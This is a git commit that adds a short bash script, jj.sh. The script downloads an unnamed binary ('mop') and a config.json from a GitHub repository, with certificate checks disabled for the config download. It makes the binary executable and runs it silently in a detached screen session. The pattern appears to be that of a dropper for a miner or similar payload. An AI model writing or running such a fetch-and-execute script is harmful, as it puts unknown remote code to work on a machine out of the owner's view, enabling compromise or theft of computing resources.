da8ef41cb7f48c5741eab0c5ad8fbd037a93c819
dballard198 <dballard198@gmail.com>
2026-06-07 10:51:15 +0900

    Create jj.sh

---
+++ jj.sh
@@ -0,0 +1,5 @@
+#!/bin/bash
+wget https://raw.githubusercontent.com/dballard198/jackse/refs/heads/main/mop
+chmod u+x mop
+wget --no-check-certificate -qO ./config.json https://raw.githubusercontent.com/dballard198/jackse/refs/heads/main/kk.json
+screen -dmS task bash -c "./mop"
